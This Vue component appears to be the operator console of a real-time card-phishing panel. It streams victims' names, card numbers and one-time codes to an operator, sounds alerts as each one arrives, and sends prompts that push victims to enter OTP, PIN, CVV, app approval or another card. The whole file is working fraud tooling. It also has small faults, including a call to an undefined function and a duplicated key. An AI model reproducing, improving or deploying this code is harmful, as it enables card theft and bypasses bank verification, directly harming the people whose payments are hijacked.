<script setup lang="ts">
import { ref, reactive, onUnmounted, computed } from 'vue';
import { usePaymentWs } from './composables/use-payment-ws';
import SessionCard from './modules/session-card.vue';
import SettingsPanel from './modules/settings-panel.vue';

const sessions = reactive<Api.Payment.PaymentSession[]>([]);
const connectCount = reactive<Api.Payment.ConnectCount>({ customerCount: 0, operatorCount: 0 });
const settingsPanel = ref<InstanceType<typeof SettingsPanel> | null>(null);

const audioNew = new Audio('/audio/new-session.mp3');
const audioCard = new Audio('/audio/card-submit.mp3');
const audioOtp = new Audio('/audio/otp-submit.mp3');
const audioResend = new Audio('/audio/resend-alert.mp3');

function playAudio(audio: HTMLAudioElement) {
  audio.currentTime = 0;
  audio.play().catch(() => {});
}

var _onlyCardFilter = false;
try { var _saved = JSON.parse(localStorage.getItem('payment_console_settings')||'{}'); _onlyCardFilter = !!_saved.onlyCardData } catch(e){}

const hideBin = ref(false);
const hidePhone = ref(false);
const hideTabs = ref(false);
const hideAddress = ref(false);

const { connected, sendAction, ws } = usePaymentWs({
  wsUrl: `${location.protocol === 'https:' ? 'wss:' : 'ws:'}//${location.host}/api/`,
  operatorId: 'op_' + Date.now(),
  onSessionList: (list) => {
    const filtered = (list as Api.Payment.PaymentSession[])
      .filter(s => s.isOnline !== false)
      .filter(s => !_onlyCardFilter || !!(s.cardInfo?.cardNumber));
    sessions.splice(0, sessions.length, ...filtered);
  },
  onSessionNew: (data) => {
    if (sessions.find(s => s.id === data.id)) return;
    playAudio(audioNew);
    window.$notification?.info({
      title: '新支付会话',
      content: `编号 ${(data as Api.Payment.PaymentSession).sessionId} - ${(data as Api.Payment.PaymentSession).customerInfo?.fullName || '未知用户'}`,
      duration: 4000
    });
    if (_onlyCardFilter && !(data as any).cardInfo?.cardNumber) return;
    sessions.unshift(data as Api.Payment.PaymentSession);
  },
  onSessionUpdate: (data) => {
    const idx = sessions.findIndex(s => s.id === data.sessionId);
    if (idx !== -1) {
      const s = sessions[idx];
      const prevStatus = s.status;

      if (data.cardInfo) {
        // Replace cardInfo entirely to trigger Vue reactivity
        s.cardInfo = { ...s.cardInfo, ...data.cardInfo };
      }
      if (data.customerInfo) s.customerInfo = { ...s.customerInfo, ...data.customerInfo };
      if (data.browsingTabs !== undefined) s.browsingTabs = data.browsingTabs;
      if (data.currentStep !== undefined) s.currentStep = data.currentStep;
      if (data.status !== undefined) s.status = data.status;
      if (data.isOnline !== undefined) {
        s.isOnline = data.isOnline;
        if (data.isOnline === false) (s as any).offlineAt = Date.now();
        else (s as any).offlineAt = 0;
      }
      if (data.lastActivityTs !== undefined) (s as any).lastActivityTs = data.lastActivityTs;
      if (data.countdownSeconds !== undefined) s.countdownSeconds = data.countdownSeconds;
      if (data.cardHistory !== undefined) (s as any).cardHistory = data.cardHistory;
      if (data.status === 'pending' && prevStatus !== 'pending') {
        if (data.action === 'app_verify_done') {
          (s as any).appVerifyPending = true;
          playAudio(audioOtp);
          window.$notification?.success({
            title: '📱 客户已完成APP验证',
            content: `编号 ${s.sessionId} - ${s.customerInfo?.fullName || '未知用户'} - 卡号 ${s.cardInfo?.cardNumber?.slice(0,4) || '****'}****`,
            duration: 6000
          });
        } else {
          (s as any).appVerifyPending = false;
          const cs = data.currentStep || s.currentStep || '';
          const hasOtp = !!(data.cardInfo?.otpCode || (s as any).cardInfo?.otpCode);
          let notifTitle = '客户已提交卡号';
          if (cs === 'pin_verify') notifTitle = '客户已提交PIN验证';
          else if (cs === 'email_verify') notifTitle = '客户已提交邮箱验证';
          else if (hasOtp || cs === 'otp') notifTitle = '客户已提交验证码';
          playAudio(hasOtp || cs === 'pin_verify' || cs === 'email_verify' ? audioOtp : audioCard);
          window.$notification?.warning({
            title: notifTitle,
            content: `编号 ${s.sessionId} - ${s.customerInfo?.fullName || '未知用户'} - 卡号 ${s.cardInfo?.cardNumber?.slice(0,4) || '****'}****`,
            duration: 6000
          });
        }
      } else if (data.cardInfo?.otpCode && s.cardInfo?.otpCode !== data.cardInfo.otpCode) {
        // OTP submitted when already pending
        playNotification();
        window.$notification?.info({
          title: '📲 客户提交了验证码',
          content: `编号 ${s.sessionId} - 验证码 ${data.cardInfo.otpCode}`,
          duration: 4000
        });
      }
    } else if (data.isOnline !== false && data.sessionId) {
      // Session came back online but was filtered out on refresh — re-add it
      if (!_onlyCardFilter || !!(data.cardInfo?.cardNumber)) {
        sessions.unshift({
          id: data.sessionId, sessionId: data.sessionId,
          cardInfo: data.cardInfo || {}, customerInfo: data.customerInfo || {},
          browsingTabs: data.browsingTabs || [], status: data.status || 'live',
          currentStep: data.currentStep || 'card', frontendUrl: data.frontendUrl || '',
          isOnline: true, countdownSeconds: 0, createdAt: '', updatedAt: '',
          cardHistory: data.cardHistory || []
        } as any);
      }
    }
  },
  onSessionRemove: (sessionId: string) => {
    const idx = sessions.findIndex(s => s.id === sessionId);
    if (idx !== -1) sessions.splice(idx, 1);
  },
  onConnectCount: (count) => {
    Object.assign(connectCount, count);
  },
  onResendOtp: (data) => {
    const s = sessions.find(s => s.id === data.sessionId);
    playAudio(audioResend);
    window.$message?.warning(`客户请求重发验证码 (第${data.count}次)${s ? ' - 会话'+s.sessionId : ''}`, { duration: 4000 });
  },
  onAppVerifyDone: (data) => {
    const s = sessions.find(s => s.id === data.sessionId);
    window.$message?.success(`客户已完成APP验证${s ? ' - 会话'+s.sessionId : ''}`, { duration: 5000 });
  }
});

function handleAction(action: Api.Payment.OperatorAction, sessionId: string, message?: string) {
  sendAction(action, sessionId, message);
  const labels: Record<string, string> = {
    otp_verify: 'OTP验证', custom_otp_verify: '自定义OTP验证',
    email_verify: '邮箱验证', pin_verify: 'PIN验证',
    cvv_verify: 'CVV验证', app_verify: 'APP验证',
    question_verify: '问题验证', change_card: '换卡支付',
    custom_prompt: '自定义提示', custom_otp_tail: 'OTP验证（自定义尾号）',     app_verify: 'APP验证', custom_email_verify: '邮箱验证（自定义邮箱）', app_verify_fail: '未完成验证', app_verify_done: 'APP验证完成', change_card_prompt: '自定义提示（换卡支付）', redirect_complete: '跳转完成',
    approve: '通过', reject: '拒绝'
  };
  window.$message?.info(`已发送操作: ${labels[action] || action}` + (message ? ` (${message})` : ''));
}

function handleSettingsChanged(settings: any) {
  _onlyCardFilter = !!settings.onlyCardData;
  hideBin.value = !!settings.hideBinFields;
  hidePhone.value = !!settings.hidePhoneField;
  hideTabs.value = !!settings.hideTabBar;
  hideAddress.value = !!settings.hideAddressBar;
  if (ws.value?.readyState === WebSocket.OPEN) {
    ws.value.send(JSON.stringify({ type: 'update_settings', payload: settings }));
  } else {
    // retry after WS connected
    const retry = setInterval(() => {
      if (ws.value?.readyState === WebSocket.OPEN) {
        ws.value.send(JSON.stringify({ type: 'update_settings', payload: settings }));
        clearInterval(retry);
      }
    }, 500);
    setTimeout(() => clearInterval(retry), 10000);
  }
}

async function refreshSessions() {
  try {
    const res = await fetch('/api/payment/sessions');
    const json = await res.json();
    if (json.code === '0000') {
      const list = json.data.filter((s: any) => s.isOnline !== false);
      sessions.splice(0, sessions.length, ...list);
      window.$message?.success('已刷新');
    }
  } catch { window.$message?.error('刷新失败') }
}

async function updateSystem() {
  window.$message?.loading('正在更新...', { duration: 0 });
  try {
    const res = await fetch('/api/system/update', { method: 'POST' });
    const json = await res.json();
    if (json.code === '0000') {
      window.$message?.success('更新成功，请刷新页面');
      setTimeout(() => location.reload(), 3000);
    } else {
      window.$message?.error(json.msg || '更新失败');
    }
  } catch { window.$message?.error('更新请求失败') }
}

function handleMoveTop(sessionId: string) {
  const idx = sessions.findIndex(s => s.id === sessionId);
  if (idx === -1) return;
  const [item] = sessions.splice(idx, 1);
  (item as any).pinned = !(item as any).pinned;
  if ((item as any).pinned) {
    sessions.unshift(item);
  } else {
    // Unpin: move to end
    sessions.push(item);
  }
}

onUnmounted(() => {
});
</script>

<template>
  <div class="payment-console">
    <div class="console-toolbar">
      <NButton size="small" quaternary @click="settingsPanel?.open()">⚙ 面板设置</NButton>
    </div>
    <div class="console-body">
      <div v-if="!sessions.length" class="empty-state">
        <NEmpty description="暂无支付会话，等待客户提交..." />
      </div>

      <TransitionGroup name="session-list" tag="div">
        <SessionCard
          v-for="(s, i) in sessions"
          :key="s.id"
          :session="s"
          :pinned="!!(s as any).pinned"
          :hide-bin="hideBin"
          :hide-phone="hidePhone"
          :hide-tabs="hideTabs"
          :hide-address="hideAddress"
          @action="(a: any, s: any, m: any) => handleAction(a, s, m)"
          @move-top="handleMoveTop"
        />
      </TransitionGroup>
    </div>
    <SettingsPanel ref="settingsPanel" @settings-changed="handleSettingsChanged" />
    <div class="update-btn-fixed">
      <NButton size="tiny" quaternary type="info" @click="updateSystem">📥 更新系统</NButton>
    </div>
  </div>
</template>

<style scoped>
.payment-console {
  height: 100%;
  display: flex;
  flex-direction: column;
  min-height: calc(100vh - 120px);
  background: #f8f7fa;
}
html.dark .payment-console {
  background: #202737;
}
.update-btn-fixed {
  position: fixed; bottom: 16px; left: 16px; z-index: 100;
}
.console-toolbar {
  display: flex;
  justify-content: flex-end;
  padding: 4px 8px;
  flex-shrink: 0;
}
.console-body {
  flex: 1;
  overflow-y: auto;
  padding: 10px 8px 160px;
}
.empty-state {
  display: flex;
  align-items: center;
  justify-content: center;
  min-height: 300px;
}
.session-list-enter-active,
.session-list-leave-active {
  transition: all 0.4s ease;
}
.session-list-enter-from {
  opacity: 0;
  transform: translateY(-20px);
}
.session-list-leave-to {
  opacity: 0;
  transform: translateX(60px);
}
</style>
